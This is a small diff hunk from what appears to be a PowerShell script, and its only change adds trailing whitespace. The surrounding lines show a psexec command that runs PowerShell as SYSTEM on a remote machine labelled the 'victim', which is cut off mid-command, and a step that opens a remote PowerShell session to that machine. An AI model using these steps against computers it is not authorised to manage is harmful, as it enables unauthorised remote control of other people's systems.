@@ -4,7 +4,7 @@ psexec.exe /acceptEula \\(yourVictimsComputer) -d -h -s powershell.exe ""Enable-
 
 # 3. Start a new PSSession connecting to their workstation: 
 
-New-PSSession -ComputerName YourVictimsComputer
+New-PSSession -ComputerName YourVictimsComputer 
 
 # 4. Load this function:
 
